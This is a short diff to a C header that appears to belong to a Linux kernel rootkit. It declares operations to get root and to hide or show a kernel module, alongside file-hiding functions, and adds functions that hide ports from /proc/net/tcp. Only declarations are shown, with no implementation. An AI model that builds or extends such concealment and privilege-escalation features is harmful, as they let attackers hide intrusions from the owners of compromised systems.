@@ -6,8 +6,11 @@
 
 enum operation_num { GET_ROOT, SHOW_MODULE, HIDE_MODULE };
 
-struct name_list {
-    char *name;
+struct struct_list {
+    union {
+        char *name;
+        unsigned long num;
+    };
     struct list_head list;
 };
 
@@ -37,3 +40,14 @@ void hide_file(const char *name);
  * show_file - Show the file hided by `hide_file`.
  */
 void show_file(const char *name);
+
+/**
+ * hide_port - Hide the port shown by /proc/net/tcp
+ */
+void hide_port(unsigned int port);
+
+
+/**
+ * show_port - Show the port hided by `hide_port`
+ */
+void show_port(unsigned int port);
